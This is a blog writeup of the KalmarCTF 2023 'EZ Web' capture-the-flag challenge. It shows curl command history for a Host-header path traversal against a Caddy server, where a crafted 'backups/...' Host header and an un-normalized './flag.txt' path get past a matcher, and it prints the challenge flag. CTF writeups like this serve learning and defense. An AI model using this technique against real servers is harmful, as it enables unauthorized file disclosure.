---
title: "KalmarCTF 2023 - EZ Web - Writeup"
date: "2023-03-05"
---

I participated in KalmarCTF as part of team Kassipojad :cat2:. One of the best
CTFs I've ever played!!

Here's a writeup of the EZ Web task, or rather a dump of the notes I took:

## What do we know?

* URL https://www.caddy.chal-kalmarc.tf/flag.txt returns 403
* https://php.caddy.chal-kalmarc.tf/flag.txt
* https://php.caddy.chal-kalmarc.tf/index.php
* https://static.caddy.chal-kalmarc.tf/logo_round.svg

* Source is included 
* compose file includes some backup step
* Backups folder includes the host
  * `cp -r *.caddy.chal-kalmarc.tf backups/ && rm php.caddy.chal-kalmarc.tf/flag.txt && sleep 1 && caddy run`

* Can use slashes in host
* Caddy v1 has an admin API on a separate port
* Caddy matchers (`respond /flag.txt`) don't run `path.Clean()`
* Caddy staticfile server (`root /srv/$host/`) performs `path.Clean()`

## What to do:

* Make caddy read a file from `/srv/backups/php.caddy.chal-kalmarc.tf/flag.txt`
* Root `/srv/{host}` looks promising...
  * Does it trust the Host header?
    * Yes it does
  * Does it accept slashes?
    * Yes it does

## Started trying...

```
 4972  curl -H 'Host: php.caddy.chal-kalmarc.tf' https://php.caddy.chal-kalmarc.tf/index.php
 4973  curl -k -v -H 'Host: php.caddy.chal-kalmarc.tf' https://php.caddy.chal-kalmarc.tf/index.php
 4974  curl -k -v -H 'Host: ../flag.txt.caddy.chal-kalmarc.tf' https://php.caddy.chal-kalmarc.tf/
 4975  curl -k -v -H 'Host: index.html.caddy.chal-kalmarc.tf' https://php.caddy.chal-kalmarc.tf/
 4976  curl -k -v -H 'Host: wow.caddy.chal-kalmarc.tf' https://php.caddy.chal-kalmarc.tf/
 4977  curl -k -v -H 'Host: stderr.caddy.chal-kalmarc.tf' https://php.caddy.chal-kalmarc.tf/
 4978  curl -k -v -H 'Host: wow' https://php.caddy.chal-kalmarc.tf/
 4979  curl -k -v -H 'Host: flag.txt' https://php.caddy.chal-kalmarc.tf/
 4980  curl -k -v  https://backups.php.caddy.chal-kalmarc.tf/flag.txt
 4981  curl -k -v  http://backups.php.caddy.chal-kalmarc.tf/flag.txt
 4982  curl -k -v  http://backups.php.caddy.chal-kalmarc.tf:443/flag.txt
 4983  curl -k -v  http://backups.php.caddy.chal-kalmarc.tf:443/index.php
 4984  curl -k -v  https://backups.php.caddy.chal-kalmarc.tf:443/index.php
 4985  curl -v  https://php.caddy.chal-kalmarc.tf:443/index.php
 4986  curl -vk  https://php.caddy.chal-kalmarc.tf:443/index.php
```

This is not working.

## So let's keep trying the backup idea:

```
 4987  curl -vk -H 'Host: backups.php.caddy.chal-kalmarc.tf' https://php.caddy.chal-kalmarc.tf:443/index.php
 4988  curl -vk -H 'Host: backups/php.caddy.chal-kalmarc.tf' https://php.caddy.chal-kalmarc.tf:443/index.php
 4989  curl -vk -H 'Host: backups/php.caddy.chal-kalmarc.tf' https://php.caddy.chal-kalmarc.tf:443/flag.txt
 4990  curl -vk -H 'Host: backups/php.caddy.chal-kalmarc.tf' https://php.caddy.chal-kalmarc.tf:443/index.php
 4991  curl -vk -H 'Host: backups/php.caddy.chal-kalmarc.tf' https://php.caddy.chal-kalmarc.tf:443/./index.php
 4992  curl -vk -H 'Host: backups/php.caddy.chal-kalmarc.tf' https://php.caddy.chal-kalmarc.tf:443/'./index.php'
 4993  curl -vk -H 'Host: backups/php.caddy.chal-kalmarc.tf' https://php.caddy.chal-kalmarc.tf:443/../index.php
 4994  curl -vk -H 'Host: backups/php.caddy.chal-kalmarc.tf/flag.txt' https://php.caddy.chal-kalmarc.tf:443/
 4995  curl -vk -H 'Host: backups/php.caddy.chal-kalmarc.tf/flag.txt' https://php.caddy.chal-kalmarc.tf:443/index.php
 4996  curl -vk -H 'Host: backups/php.caddy.chal-kalmarc.tf' https://php.caddy.chal-kalmarc.tf:443/f\*
 4997  curl -vk -H 'Host: backups/php.caddy.chal-kalmarc.tf' https://php.caddy.chal-kalmarc.tf:443/flag.txt
```

## Heureka

Wait, curl, don't normalize the path!

After a lot of trying:

```
❯ curl --path-as-is -vk -H 'Host: backups/php.caddy.chal-kalmarc.tf' https://php.caddy.chal-kalmarc.tf:443/./flag.txt
```

So yes, the "respond" matcher was not normalizing paths the same way the file server was.

kalmar{th1s-w4s-2x0d4ys-wh3n-C4ddy==2.4}

## Learnings

* Even caddy has unique behaviors
* Don't get stuck on the admin endpoint

